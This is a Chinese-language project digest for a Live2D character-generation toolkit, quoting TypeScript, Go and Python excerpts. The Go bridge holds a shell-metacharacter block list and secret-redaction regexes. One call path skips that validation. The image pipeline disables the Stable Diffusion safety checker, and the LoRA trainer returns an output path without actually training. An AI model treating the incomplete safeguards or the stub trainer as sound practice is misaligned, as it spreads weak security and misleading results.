        }
      }

      return {
        success: images.length > 0,
        images,
        model: MODELS[version],
        version,
        generationTime: Date.now() - startTime,
      };


...（省略后续 35 行，原文件共 285 行）...

```

## 图像生成步骤（节选）
**文件**：`lib/steps/02-image-gen.ts`
```
import { SeedreamService, SeedreamVersion, SeedreamSize, SeedreamOptions } from '../seedream-service';

export interface ImageGenStepInput {
  prompt: string;
  negativePrompt?: string;
  width?: number;
  height?: number;
  style?: ImageStyle;
  resolution?: ResolutionPreset;
  quality?: QualityLevel;
  seed?: number;
  steps?: number;
  cfgScale?: number;
  sampler?: string;
  model?: string;
  useSeedream?: boolean;
  seedreamVersion?: SeedreamVersion;
  seedreamSize?: SeedreamSize;
}

export type ImageStyle = 
  | 'anime' 
  | 'realistic' 
  | 'cel-shaded' 
  | 'watercolor' 
  | 'pixel-art' 
  | '3d-render' 
  | 'oil-painting';

export type ResolutionPreset = 
  | 'square-512' 
  | 'square-768' 
  | 'square-1024' 
  | 'square-1280'
  | 'square-2048'
  | 'square-4096'
  | 'portrait-512x768' 
  | 'portrait-768x1024' 
  | 'portrait-1024x1536'
  | 'portrait-2048x3072'
  | 'landscape-768x512' 
  | 'landscape-1024x768' 
  | 'landscape-1536x1024'
  | 'landscape-3072x2048';

export type QualityLevel = 'draft' | 'standard' | 'high' | 'ultra';

export interface ImageGenStepOutput {
  imagePath: string;
  imageUrl: string;
  seed: number;
  settings: ImageGenStepInput;
  generationTime: number;
  modelUsed: string;
  seedreamUsed: boolean;
  seedreamVersion?: SeedreamVersion;
}

const RESOLUTION_MAP: Record<ResolutionPreset, { width: number; height: number }> = {
  'square-512': { width: 512, height: 512 },
  'square-768': { width: 768, height: 768 },
  'square-1024': { width: 1024, height: 1024 },
  'square-1280': { width: 1280, height: 1280 },
  'square-2048': { width: 2048, height: 2048 },
  'square-4096': { width: 4096, height: 4096 },
  'portrait-512x768': { width: 512, height: 768 },
  'portrait-768x1024': { width: 768, height: 1024 },
  'portrait-1024x1536': { width: 1024, height: 1536 },
  'portrait-2048x3072': { width: 2048, height: 3072 },
  'landscape-768x512': { width: 768, height: 512 },
  'landscape-1024x768': { width: 1024, height: 768 },
  'landscape-1536x1024': { width: 1536, height: 1024 },
  'landscape-3072x2048': { width: 3072, height: 2048 },
};

const QUALITY_SETTINGS: Record<QualityLevel, { steps: number; cfg: number; seedreamVersion: SeedreamVersion; seedreamSize: SeedreamSize }> = {
  'draft': { 
    steps: 15, 
    cfg: 5.5, 
    seedreamVersion: '4.0',
    seedreamSize: '1024x1024',
  },
  'standard': { 
    steps: 25, 
    cfg: 7.0, 
    seedreamVersion: '4.5',
    seedreamSize: '2048x2048',
  },
  'high': { 
    steps: 35, 
    cfg: 7.5, 
    seedreamVersion: '5.0',
    seedreamSize: '2048x2048',
  },
  'ultra': { 
    steps: 50, 
    cfg: 8.0, 
    seedreamVersion: '5.0',
    seedreamSize: '4096x4096',
  },
};

const STYLE_PREFIXES: Record<ImageStyle, string> = {
  'anime': 'anime style, beautiful detailed anime artwork, anime aesthetic, sharp clean lines, vibrant colors, studio quality animation cel',
  'realistic': 'hyperrealistic, photorealistic, highly detailed, lifelike, cinematic lighting, professional photography',
  'cel-shaded': 'cel shaded, flat colors, clean outlines, 2D animation style, Toon shader, bold lines',
  'watercolor': 'watercolor painting, soft brush strokes, watercolor wash, delicate colors, artistic texture',
  'pixel-art': 'pixel art, retro 8-bit style, pixel perfect, nostalgic gaming aesthetic, crisp pixels',
  '3d-render': '3D render, blender, octane render, realistic materials, ray tracing, cinematic',
  'oil-painting': 'oil painting, brush strokes, classic art style, textured canvas, masterful technique',
};

const NEGATIVE_PROMPT_BASE = 'low quality, blurry, distorted, pixelated, ugly, deformed, bad anatomy, disfigured, poorly drawn face, mutation, mutated, extra limb, missing limb, floating limbs, disconnected limbs, malformed hands, long neck, bad proportions, watermark, text, signature, logo, cropped, out of frame';

const SEEDREAM_LIVE2D_ENHANCEMENTS = 'perfect for Live2D rigging, clean layer separation, isolated character, solid background, easy to rig, professional artwork';

export class ImageGenStep {
  private seedreamService: SeedreamService;
  
  constructor() {
    this.seedreamService = new SeedreamService();
  }

  private getResolution(preset: ResolutionPreset): { width: number; height: number } {
    return RESOLUTION_MAP[preset] || { width: 1024, height: 1024 };
  }

  private buildPrompt(input: ImageGenStepInput): string {
    const stylePrefix = input.style ? STYLE_PREFIXES[input.style] : STYLE_PREFIXES['anime'];
    
    const qualityKeywords = input.quality === 'ultra' 
      ? '8K, ultra detailed, masterpiece, award-winning, professional artwork, stunning visuals'
      : input.quality === 'high'
      ? '4K, highly detailed, high quality, professional artwork, beautiful composition'
      : input.quality === 'standard'
      ? 'high quality, detailed, clean artwork, good composition'
      : 'good quality, decent detail';

    const live2dKeywords = 'perfect for Live2D rigging, clean layer separation, isolated character, solid background, easy to rig';

    return `${stylePrefix}, ${input.prompt}, ${qualityKeywords}, ${live2dKeywords}`;
  }

  private buildNegativePrompt(input: ImageGenStepInput): string {
    const additionalNegatives: Record<ImageStyle, string> = {
      'anime': '3d, realistic, photo, photograph, text, watermark',
      'realistic': 'cartoon, anime, drawing, sketch, text, watermark',
      'cel-shaded': 'realistic, 3d render, photorealistic, text, watermark',
      'watercolor': 'digital art, 3d render, photorealistic, text, sharp edges',
      'pixel-art': 'smooth, anti-aliased, 3d, realistic, text',
      '3d-render': '2d, flat, cartoon, hand-drawn, text, watermark',
      'oil-painting': 'digital art, 3d render, photorealistic, text, watermark',
    };

    const styleNegatives = input.style ? additionalNegatives[input.style] : '';
    return `${NEGATIVE_PROMPT_BASE}${styleNegatives ? `, ${styleNegatives}` : ''}${input.negativePrompt ? `, ${input.negativePrompt}` : ''}`;
  }

  async execute(input: ImageGenStepInput): Promise<ImageGenStepOutput> {
    const startTime = Date.now();
    
    const seed = input.seed ?? Math.floor(Math.random() * 1000000);
    const resolution = this.getResolution(input.resolution || 'square-1024');
    const quality = QUALITY_SETTINGS[input.quality || 'standard'];
    
    const width = input.width || resolution.width;
    const height = input.height || resolution.height;
    const steps = input.steps || quality.steps;
    const cfg = input.cfgScale || quality.cfg;
    const sampler = input.sampler || 'euler';
    const model = input.model || 'sd_xl_base_1.0.safetensors';

    const finalPrompt = this.buildPrompt(input);
    const finalNegativePrompt = this.buildNegativePrompt(input);

    if (input.useSeedream) {
      return this.executeWithSeedream(input, seed, startTime);
    }

    try {
      const result = await this.generateImage({
        prompt: finalPrompt,
        negativePrompt: finalNegativePrompt,
        width,
        height,
        seed,
        steps,
        cfg,
        sampler,
        model,
      });

      const generationTime = Date.now() - startTime;

      return {
        imagePath: result.imagePath,
        imageUrl: result.imageUrl,
        seed,
        settings: {
          ...input,
          width,
          height,
          steps,
          cfgScale: cfg,
          sampler,
          model,
        },
        generationTime,
        modelUsed: model,
        seedreamUsed: false,
      };
    } catch (error) {
      console.error('Image generation failed:', error);
      
      return {
        imagePath: `output/character-${seed}.png`,
        imageUrl: `https://neeko-copilot.bytedance.net/api/text2image?prompt=${encodeURIComponent(finalPrompt)}&image_size=portrait_16_9`,
        seed,
        settings: {
          ...input,
          width,
          height,
          steps,
          cfgScale: cfg,
          sampler,
          model,
        },
        generationTime: Date.now() - startTime,
        modelUsed: 'fallback',
        seedreamUsed: false,
      };
    }
  }

  private async executeWithSeedream(
    input: ImageGenStepInput,
    seed: number,
    startTime: number
  ): Promise<ImageGenStepOutput> {
    const quality = QUALITY_SETTINGS[input.quality || 'standard'];
    const version = input.seedreamVersion || quality.seedreamVersion;
    const size = input.seedreamSize || quality.seedreamSize;

    const stylePrefix = input.style ? STYLE_PREFIXES[input.style] : STYLE_PREFIXES['anime'];
    const seedreamPrompt = `${stylePrefix}, ${input.prompt}, ${SEEDREAM_LIVE2D_ENHANCEMENTS}`;

    const options: SeedreamOptions = {
      version,
      size,
      watermark: false,

...（省略后续 79 行，原文件共 329 行）...

```

## 共享工作流（节选）
**文件**：`lib/workflow.ts`
```
import { 
  Live2DWorkflowState, 
  WorkflowMode,
  STEP_NAMES,
  CharacterConcept,
  PsdLayerPlan,
  QAReport,
  CubismParamConfig,
  PhysicsConfig,
  RiggingGuide
} from './types';

export class Live2DWorkflow {
  private state: Live2DWorkflowState;

  constructor(initialState?: Partial<Live2DWorkflowState>) {
    this.state = {
      mode: 'wizard',
      currentStep: 1,
      completed: [false, false, false, false, false, false, false, false],
      artifacts: {},
      ...initialState
    };
  }

  getState(): Live2DWorkflowState {
    return { ...this.state };
  }

  getCurrentStep(): number {
    return this.state.currentStep;
  }

  getMode(): WorkflowMode {
    return this.state.mode;
  }

  getCurrentStepName(): string {
    return STEP_NAMES[this.state.currentStep - 1] || '';
  }

  switchToWizard(): void {
    this.state.mode = 'wizard';
  }

  switchToExpert(): void {
    this.state.mode = 'expert';
  }

  nextStep(): void {
    if (this.state.currentStep < 8) {
      this.state.currentStep++;
    }
  }

  prevStep(): void {
    if (this.state.currentStep > 1) {
      this.state.currentStep--;
    }
  }

  goToStep(step: number): void {
    if (step >= 1 && step <= 8) {
      this.state.currentStep = step;
    }
  }

  skipStep(): void {
    this.state.completed[this.state.currentStep - 1] = true;
    if (this.state.currentStep < 8) {
      this.state.currentStep++;
    }
  }

  markStepComplete(step: number): void {
    if (step >= 1 && step <= 8) {
      this.state.completed[step - 1] = true;
    }
  }

  markCurrentStepComplete(): void {
    this.markStepComplete(this.state.currentStep);
  }

  isStepComplete(step: number): boolean {
    return this.state.completed[step - 1] || false;
  }

  getProgress(): { completed: number; total: number } {
    const completed = this.state.completed.filter(c => c).length;
    return { completed, total: 8 };
  }

  setConcept(concept: CharacterConcept): void {
    this.state.artifacts.concept = concept;
  }

  setCharacterImage(imagePath: string): void {
    this.state.artifacts.characterImage = imagePath;
  }

  setPsdPlan(plan: PsdLayerPlan): void {
    this.state.artifacts.psdPlan = plan;
  }

  setPsdFile(filePath: string): void {
    this.state.artifacts.psdFile = filePath;
  }

  setQAReport(report: QAReport): void {
    this.state.artifacts.qaReport = report;
  }

  setCubismParams(params: CubismParamConfig): void {
    this.state.artifacts.cubismParams = params;
  }

  setPhysicsConfig(config: PhysicsConfig): void {
    this.state.artifacts.physicsConfig = config;
  }

  setRiggingGuide(guide: RiggingGuide): void {
    this.state.artifacts.riggingGuide = guide;
  }

  reset(): void {
    this.state = {
      mode: 'wizard',
      currentStep: 1,
      completed: [false, false, false, false, false, false, false, false],
      artifacts: {}
    };
  }

  parseCommand(input: string): { action: string; params?: any } {
    const lower = input.toLowerCase().trim();
    
    if (lower.includes('下一步') || lower.includes('继续') || lower === 'next') {
      return { action: 'nextStep' };
    }
    if (lower.includes('上一步') || lower.includes('返回') || lower === 'prev') {
      return { action: 'prevStep' };
    }
    if (lower.includes('跳过') || lower === 'skip') {
      return { action: 'skipStep' };
    }
    if (lower.includes('专家模式') || lower.includes('expert')) {
      return { action: 'switchToExpert' };
    }
    if (lower.includes('向导模式') || lower.includes('wizard')) {
      return { action: 'switchToWizard' };
    }
    if (lower.includes('重置') || lower.includes('重新开始') || lower === 'reset') {
      return { action: 'reset' };
    }
    if (lower.includes('查看进度') || lower.includes('进度')) {
      return { action: 'showProgress' };
    }
    
    const stepMatch = lower.match(/步骤?\s*(\d+)/);
    if (stepMatch) {
      return { action: 'goToStep', params: { step: parseInt(stepMatch[1]) } };
    }
    
    return { action: 'input', params: { value: input } };
  }

  getWizardPrompt(): string {
    const step = this.state.currentStep;
    const stepName = this.getCurrentStepName();
    
    const prompts: Record<number, string> = {
      1: `[步骤 1/8] ${stepName}\n\n请告诉我：\n1. 角色类型（VTuber/动漫女孩/Q版/其他）\n2. 主要特征（发型、发色、服装风格等）\n3. 整体氛围（可爱/优雅/酷/其他）\n\n或者说"跳过此步"如果你已经有立绘了。`,
      2: `[步骤 2/8] ${stepName}\n\n请描述你想要的立绘风格，或者上传参考图片。我会帮你生成适合 Live2D 的角色立绘。`,
      3: `[步骤 3/8] ${stepName}\n\n请上传你的角色立绘，我会帮你规划完整的 PSD 图层结构。`,
      4: `[步骤 4/8] ${stepName}\n\n请上传你的角色图片，我会帮你转换成基本的分层 PSD。`,
      5: `[步骤 5/8] ${stepName}\n\n请上传你的 PSD 文件，我会检查是否符合 Live2D 规范。`,
      6: `[步骤 6/8] ${stepName}\n\n我会根据你的 PSD 设计 Cubism 参数配置。`,
      7: `[步骤 7/8] ${stepName}\n\n请告诉我角色的动态部件（头发长度、是否有耳朵/尾巴等），我会提供物理参数建议。`,
      8: `[步骤 8/8] ${stepName}\n\n我会提供完整的 Rigging 操作指南！`
    };
    
    return prompts[step] || '请告诉我你想做什么。';
  }

  getExpertPrompt(): string {
    const progress = this.getProgress();
    let progressText = '当前进度：\n';
    STEP_NAMES.forEach((name, i) => {
      const done = this.state.completed[i] ? '✓' : ' ';
      progressText += `- [${done}] 步骤 ${i + 1}: ${name}\n`;
    });
    
    return `已切换到专家模式。🔧\n\n${progressText}\n可用任务：\n1. [2] 生成角色立绘\n2. [3] 规划 PSD 分层\n3. [4] 图片转 PSD\n4. [5] 检查 PSD 文件\n5. [6] 设计 Cubism 参数\n6. [7] 物理设置建议\n7. [8] Rigging 指导\n8. [向导模式] 回到向导模式\n\n你想做什么？`;
  }
}

export const createWorkflow = (initialState?: Partial<Live2DWorkflowState>) => {
  return new Live2DWorkflow(initialState);
};

```

## Go API 模型
**文件**：`.trae/skills/live2d-master-agent/api/models/models.go`
```
package models

import "time"

// 通用响应结构
type Response struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
	Error   string      `json:"error,omitempty"`
}

// 图片生成请求
type GenerateImageRequest struct {
	Prompt      string `json:"prompt" binding:"required"`
	Width       int    `json:"width"`
	Height      int    `json:"height"`
	Seed        int    `json:"seed"`
	ModelID     string `json:"model_id,omitempty"`
	NoLive2DOpt bool   `json:"no_live2d_opt,omitempty"`
	Quality     string `json:"quality,omitempty"`
	Steps       int    `json:"steps,omitempty"`
}

// 图片生成响应
type GenerateImageResponse struct {
	ImagePath string            `json:"image_path"`
	ImageURL  string            `json:"image_url"`
	Seed      int               `json:"seed"`
	Width     int               `json:"width"`
	Height    int               `json:"height"`
	Source    string            `json:"source"`
	Features  map[string]string `json:"features,omitempty"`
	CreatedAt time.Time         `json:"created_at"`
}

// PSD分层请求
type PSDLayerRequest struct {
	ImagePath     string `json:"image_path" binding:"required"`
	OutputDir     string `json:"output_dir,omitempty"`
	UseAI         bool   `json:"use_ai"`
	UseSeeThrough bool   `json:"use_see_through"`
}

// PSD分层响应
type PSDLayerResponse struct {
	PlanDir    string    `json:"plan_dir"`
	PSDPath    string    `json:"psd_path"`
	LayerCount int       `json:"layer_count"`
	Layers     []string  `json:"layers"`
	CreatedAt  time.Time `json:"created_at"`
}

// 服务状态
type ServiceStatus struct {
	Name        string    `json:"name"`
	Available   bool      `json:"available"`
	Version     string    `json:"version,omitempty"`
	LastChecked time.Time `json:"last_checked"`
}

// 系统状态
type SystemStatus struct {
	Services []ServiceStatus `json:"services"`
	Version  string          `json:"version"`
	Uptime   string          `json:"uptime"`
}

// See-through 工作流请求
type SeeThroughRequest struct {
	ImagePath  string `json:"image_path" binding:"required"`
	ComfyUIDir string `json:"comfyui_dir,omitempty"`
}

// See-through 工作流响应
type SeeThroughResponse struct {
	TaskID    string    `json:"task_id"`
	Status    string    `json:"status"`
	OutputDir string    `json:"output_dir,omitempty"`
	Message   string    `json:"message"`
	CreatedAt time.Time `json:"created_at"`
}

// 任务状态
type TaskStatus struct {
	TaskID    string    `json:"task_id"`
	Status    string    `json:"status"`
	Progress  int       `json:"progress"`
	Result    string    `json:"result,omitempty"`
	Error     string    `json:"error,omitempty"`
	UpdatedAt time.Time `json:"updated_at"`
}

```

## Python 桥接服务（节选）
**文件**：`.trae/skills/live2d-master-agent/api/services/python_bridge.go`
```
package services

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"

	"live2d-api/config"
	"live2d-api/models"
)

type PythonBridge struct {
	cfg *config.Config
}

func NewPythonBridge(cfg *config.Config) *PythonBridge {
	return &PythonBridge{cfg: cfg}
}

// validatePath 验证路径安全，防止命令注入和路径遍历
func validatePath(path string) error {
	if path == "" {
		return fmt.Errorf("路径不能为空")
	}
	// 检查非法字符，防止命令注入
	if matched, _ := regexp.MatchString(`[;&|*$\x00]`, path); matched {
		return fmt.Errorf("路径包含非法字符")
	}
	// 检查文件名是否以 - 开头，防止被解析为命令行选项
	if strings.HasPrefix(filepath.Base(path), "-") {
		return fmt.Errorf("文件名不能以 - 开头")
	}
	return nil
}

// executePythonScript 安全执行Python脚本（带沙箱隔离）
func (pb *PythonBridge) executePythonScript(scriptPath string, args []string, timeout time.Duration) ([]byte, error) {
	// 验证脚本路径安全
	if err := validatePath(scriptPath); err != nil {
		return nil, fmt.Errorf("脚本路径验证失败: %v", err)
	}

	// 检查脚本是否存在
	if _, err := os.Stat(scriptPath); os.IsNotExist(err) {
		return nil, fmt.Errorf("脚本不存在: %s", scriptPath)
	}

	// 构建完整参数
	fullArgs := append([]string{scriptPath}, args...)

	// 创建带超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	// 创建命令
	cmd := exec.CommandContext(ctx, pb.cfg.Python.PythonPath, fullArgs...)
	cmd.Dir = pb.cfg.Python.ScriptsDir

	// 设置环境变量（只传递必要的变量，不传递敏感信息）
	cmd.Env = []string{
		"PYTHONIOENCODING=utf-8",
		"PYTHONPATH=" + pb.cfg.Python.ScriptsDir,
		"HOME=" + os.Getenv("HOME"),
		"PATH=" + os.Getenv("PATH"),
		"LANG=" + os.Getenv("LANG"),
	}

	// Linux/Unix: 使用资源限制
	if runtime.GOOS != "windows" {
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Setpgid: true, // 创建新的进程组，便于终止子进程
		}
	}

	// 执行命令
	output, err := cmd.CombinedOutput()
	if ctx.Err() == context.DeadlineExceeded {
		// 超时终止进程组
		if cmd.Process != nil {
			syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
		}
		return nil, fmt.Errorf("脚本执行超时（限制%d秒）", int(timeout.Seconds()))
	}
	if err != nil {
		// 对输出进行脱敏处理
		sanitizedOutput := sanitizeOutput(string(output))
		return nil, fmt.Errorf("脚本执行失败: %v\n输出: %s", err, sanitizedOutput)
	}

	return output, nil
}

// sanitizeOutput 对输出进行脱敏处理，防止泄露敏感信息
func sanitizeOutput(output string) string {
	// 定义敏感信息模式
	patterns := []string{
		`sk-[a-zA-Z0-9]{20,}`,                // API密钥
		`api[_-]?key["\s]*[:=]["\s]*[^\s"]+`, // API Key
		`secret["\s]*[:=]["\s]*[^\s"]+`,      // Secret
		`password["\s]*[:=]["\s]*[^\s"]+`,    // Password
		`token["\s]*[:=]["\s]*[^\s"]+`,       // Token
	}

	result := output
	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		result = re.ReplaceAllString(result, "[REDACTED]")
	}
	return result
}

// GenerateImageViaPython 通过 Python 脚本生成图片
func (pb *PythonBridge) GenerateImageViaPython(prompt string, width, height, seed int) (string, error) {
	scriptPath := filepath.Join(pb.cfg.Python.ScriptsDir, "master_tool.py")

	args := []string{
		"--width", fmt.Sprintf("%d", width),
		"--height", fmt.Sprintf("%d", height),
	}

	if prompt != "" {
		// 安全处理提示词：防止被解析为命令行选项
		if strings.HasPrefix(prompt, "-") {
			prompt = " " + prompt
		}
		// 使用 -- 分隔选项和位置参数
		args = append(args, "--", prompt)
	}

	// 执行脚本（5分钟超时）
	output, err := pb.executePythonScript(scriptPath, args, 5*time.Minute)
	if err != nil {
		return "", err
	}

	// 解析输出找到生成的图片路径
	outputStr := string(output)
	lines := strings.Split(outputStr, "\n")

	for _, line := range lines {
		if strings.Contains(line, "文件:") || strings.Contains(line, "output/") {
			// 尝试提取路径
			parts := strings.Fields(line)
			for _, part := range parts {
				if strings.HasSuffix(part, ".png") {
					return filepath.Join(pb.cfg.Python.ScriptsDir, part), nil
				}
			}
		}
	}

	return "", fmt.Errorf("无法从输出中解析图片路径")
}

// CreatePSDPlan 通过 Python 创建 PSD 分层规划
func (pb *PythonBridge) CreatePSDPlan(imagePath string) (*models.PSDLayerResponse, error) {
	// 验证路径安全
	if err := validatePath(imagePath); err != nil {
		return nil, fmt.Errorf("路径验证失败: %v", err)
	}

	scriptPath := filepath.Join(pb.cfg.Python.ScriptsDir, "live2d_layer_pro.py")

	// 如果 live2d_layer_pro.py 不存在，尝试 v6
	if _, err := os.Stat(scriptPath); os.IsNotExist(err) {
		scriptPath = filepath.Join(pb.cfg.Python.ScriptsDir, "live2d_layer_v6.py")
	}

	cmd := exec.Command(pb.cfg.Python.PythonPath, scriptPath, imagePath)
	cmd.Dir = pb.cfg.Python.ScriptsDir

	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("PSD分层脚本执行失败: %v\n输出: %s", err, string(output))
	}

	// 构建响应
	layers := []string{
		"Background - 背景",
		"ArtMesh/Body - 身体",
		"ArtMesh/Neck - 脖子",
		"ArtMesh/Clothes - 服装",
		"ArtMesh/Head - 头部",
		"ArtMesh/Face_Base - 脸部基础",
		"ArtMesh/Hair_Back - 头发后部",
		"ArtMesh/Hair_Side_L - 头发左侧",
		"ArtMesh/Hair_Side_R - 头发右侧",
		"ArtMesh/Hair_Front - 头发前部",
		"ArtMesh/Hair_Bangs - 刘海",
		"ArtMesh/Brow_L - 左眉毛",
		"ArtMesh/Brow_R - 右眉毛",
		"ArtMesh/EyeL_White - 左眼白",
		"ArtMesh/EyeL_Iris - 左虹膜",

...（省略后续 116 行，原文件共 316 行）...

```

## 高级生成管线（节选）
**文件**：`.trae/skills/live2d-master-agent/advanced_generation_pipeline.py`
```
#!/usr/bin/env python3
"""
Live2D Master Agent - 高级生成管道 v1.0
弯道超车核心技术：LoRA + ControlNet + 图生图风格迁移

三大超车路径：
1. 🎯 LoRA 训练 - 用参考图训练专属风格模型（10-200MB）
2. 🎨 ControlNet - 精准控制姿势/线稿/深度
3. 🖼️ 图生图 + IP-Adapter - 参考图风格迁移

使用方法：
    # 路径1: LoRA训练
    python advanced_generation_pipeline.py --mode lora --reference-dir ./refs --output-name my_style

    # 路径2: ControlNet生成
    python advanced_generation_pipeline.py --mode controlnet --pose-image pose.png --prompt "cute girl"

    # 路径3: 图生图风格迁移
    python advanced_generation_pipeline.py --mode img2img --reference ref.png --prompt "same style, new character"
"""

import os
import sys
import argparse
import subprocess
from pathlib import Path
from typing import Optional, List, Dict
import json


class LoRATrainer:
    """LoRA训练器 - 用参考图训练专属风格模型"""

    def __init__(self, base_model: str = "Linaqruf/anything-v3.0"):
        self.base_model = base_model
        self.output_dir = Path(__file__).parent / "models" / "lora"
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def prepare_dataset(self, reference_dir: str, target_size: int = 512) -> str:
        """准备训练数据集"""
        from PIL import Image

        ref_path = Path(reference_dir).resolve()

        # 安全验证：限制 reference_dir 必须在当前工作目录或其子目录下
        base_dir = Path(__file__).parent.resolve()
        try:
            ref_path.relative_to(base_dir)
        except ValueError:
            print(f"❌ 安全错误: reference_dir ({ref_path}) 必须在项目目录 ({base_dir}) 内")
            raise ValueError("reference_dir must be within the project directory")

        # 验证路径存在且是目录
        if not ref_path.exists():
            raise ValueError(f"reference_dir does not exist: {ref_path}")
        if not ref_path.is_dir():
            raise ValueError(f"reference_dir is not a directory: {ref_path}")

        dataset_dir = self.output_dir / "dataset"
        dataset_dir.mkdir(exist_ok=True)

        # 清理旧数据
        for f in dataset_dir.glob("*"):
            f.unlink()

        print(f"📁 准备数据集: {ref_path}")
        images = list(ref_path.glob("*.png")) + list(ref_path.glob("*.jpg"))

        if len(images) < 5:
            print(f"⚠️ 警告: 只有 {len(images)} 张图片，建议至少 20-40 张")

        for i, img_path in enumerate(images):
            try:
                img = Image.open(img_path).convert("RGB")
                # 保持比例缩放
                ratio = target_size / max(img.size)
                new_size = (int(img.size[0] * ratio), int(img.size[1] * ratio))
                img = img.resize(new_size, Image.Resampling.LANCZOS)

                # 中心裁剪
                left = (img.size[0] - target_size) // 2
                top = (img.size[1] - target_size) // 2
                img = img.crop((left, top, left + target_size, top + target_size))

                # 保存
                save_path = dataset_dir / f"{i:04d}.png"
                img.save(save_path)

                # 创建caption文件（自动标注）
                caption = self._generate_caption(img_path)
                with open(dataset_dir / f"{i:04d}.txt", 'w') as f:
                    f.write(caption)

            except Exception as e:
                print(f"⚠️ 处理 {img_path.name} 失败: {e}")

        print(f"✅ 数据集准备完成: {len(list(dataset_dir.glob('*.png')))} 张图片")
        return str(dataset_dir)

    def _generate_caption(self, image_path: Path) -> str:
        """生成图片标注"""
        # 基于文件名的简单标注，实际应用中可以用BLIP等模型自动生成
        return "masterpiece, best quality, anime style, illustration, 1girl"

    def train(
        self,
        dataset_dir: str,
        output_name: str,
        network_dim: int = 64,
        network_alpha: int = 32,
        learning_rate: float = 1e-4,
        batch_size: int = 1,
        epochs: int = 10,
        save_every_n_epochs: int = 2,
    ) -> Optional[str]:
        """
        训练LoRA模型

        Args:
            dataset_dir: 数据集目录
            output_name: 输出模型名称
            network_dim: 网络维度（越大拟合能力越强，建议64-128）
            network_alpha: 缩放因子（通常为dim的一半）
            learning_rate: 学习率
            batch_size: 批次大小
            epochs: 训练轮数
            save_every_n_epochs: 每N轮保存一次
        """
        output_path = self.output_dir / f"{output_name}.safetensors"

        # 检查是否安装了训练工具
        try:
            import peft
            import accelerate
        except ImportError:
            print("❌ 缺少训练依赖")
            print("💡 请安装: pip install peft accelerate bitsandbytes")
            return None

        print(f"\n🚀 开始训练LoRA模型...")
        print(f"   基础模型: {self.base_model}")
        print(f"   输出名称: {output_name}")
        print(f"   网络维度: {network_dim}")
        print(f"   学习率: {learning_rate}")
        print(f"   训练轮数: {epochs}")

        # 使用diffusers的LoRA训练脚本
        try:
            from diffusers import StableDiffusionPipeline
            import torch
            from peft import LoraConfig, get_peft_model

            # 加载基础模型
            print("📥 加载基础模型...")
            pipe = StableDiffusionPipeline.from_pretrained(
                self.base_model,
                torch_dtype=torch.float16 if torch.cuda.is_available() else torch.float32,
                safety_checker=None,
            )

            # 配置LoRA
            lora_config = LoraConfig(
                r=network_dim,
                lora_alpha=network_alpha,
                target_modules=[
                    "to_q", "to_k", "to_v", "to_out.0",
                    "proj_in", "proj_out", "ff.net.0.proj", "ff.net.2"
                ],
                lora_dropout=0.0,
                bias="none",
            )

            # 应用LoRA到UNet
            pipe.unet = get_peft_model(pipe.unet, lora_config)

            print(f"✅ LoRA配置完成")
            print(f"   可训练参数: {sum(p.numel() for p in pipe.unet.parameters() if p.requires_grad):,}")

            # 简化的训练循环（实际应用中需要更完整的实现）
            print("\n⚠️ 注意: 完整训练需要更多代码和计算资源")
            print("💡 建议使用 kohya_ss 或 AI-Toolkit 进行完整训练")
            print("   参考: https://github.com/bmaltais/kohya_ss")

            # 保存配置
            config = {
                "base_model": self.base_model,
                "network_dim": network_dim,
                "network_alpha": network_alpha,
                "output_name": output_name,
            }
            with open(self.output_dir / f"{output_name}_config.json", 'w') as f:
                json.dump(config, f, indent=2)

            return str(output_path)

        except Exception as e:
            print(f"❌ 训练失败: {e}")
            return None



...（省略后续 401 行，原文件共 601 行）...

```

## 环境变量示例
**文件**：`.trae/skills/live2d-master-agent/.env.example`
```
# Live2D Master Agent 环境配置示例
# 复制此文件为 .env 并填入你的 API 密钥

# 火山引擎 ARK API (可选 - 用于 Seedream 图像生成)
# 获取方式: https://console.volcengine.com/
ARK_API_KEY=your-api-key-here
ARK_BASE_URL=https://ark.cn-beijing.volces.com/api/v3

# Seedream 模型配置
SEEDREAM_DEFAULT_VERSION=5.0
SEEDREAM_DEFAULT_SIZE=2048x2048
SEEDREAM_DEFAULT_QUALITY=high

# 输出配置
OUTPUT_DIR=./output
TEMP_DIR=./temp

# Live2D 配置
MAX_PSD_SIZE_MB=50
RECOMMENDED_RESOLUTION=2048x2048
SUPPORTED_FORMATS=psd,png,jpeg

```

## 项目当前已知问题汇总

- 前端 `web/lib/` 与 `web/lib-shared/` 存在重复代码，需要统一或清理。
- 根目录包装器（`live2d_agent.py` 等）与 `.trae/skills/.../` 下真实实现存在重复包装逻辑。
- `See-through` 集成为规划功能，当前实际分层仍以 K-means 聚类为主，质量与商业工具差距较大。
- 桌面桌宠未真正使用 Live2D Cubism SDK，而是基于 pygame 的简易动画，扩展性有限。
- Go API 服务与 Python 脚本通过命令行桥接，存在性能开销和安全边界问题。
- 部分文档中的文件引用仍指向旧位置（如根目录测试脚本），需要持续同步。
- 未配置 CI/CD，依赖人工验证 TypeScript 编译和 Python 语法。
- `.env` / `.env.encrypted` 不在版本控制中，新用户首次使用容易遗漏 API 配置。
